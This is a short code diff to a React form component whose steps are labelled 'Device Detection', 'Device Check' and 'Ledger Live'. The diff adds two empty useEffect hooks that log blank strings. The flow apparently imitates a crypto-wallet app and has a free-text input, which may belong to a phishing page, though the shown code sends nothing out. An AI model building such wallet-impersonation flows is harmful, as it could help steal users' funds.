@@ -1,4 +1,4 @@
-import React, { useState } from "react";
+import React, { useState, useEffect } from "react";
 import { useNavigate } from "react-router-dom";
 import styles from "./Form.module.css";
 import { FaCircle, FaDownload, FaArrowsRotate } from "react-icons/fa6";
@@ -17,10 +17,21 @@ import {
 const Form = () => {
   const navigate = useNavigate();
   const [selectedImage, setSelectedImage] = useState(null);
+      useEffect(() => {
+        if (selectedImage) {
+          console.log(""); 
+          }
+          }, [selectedImage]);
+  
   const [currentStep, setCurrentStep] = useState(0);
   const [loading, setLoading] = useState(false);
   const [imageSelected, setImageSelected] = useState(false);
   const [userInput, setUserInput] = useState("");
+      useEffect(() => {
+        if (userInput) {
+          console.log(""); 
+           }
+          }, [userInput]);
   const [showPopup, setShowPopup] = useState(false);
   const [formData, setFormData] = useState("");
   const steps = ["Device Detection", "Device Check", "Ledger Live"];
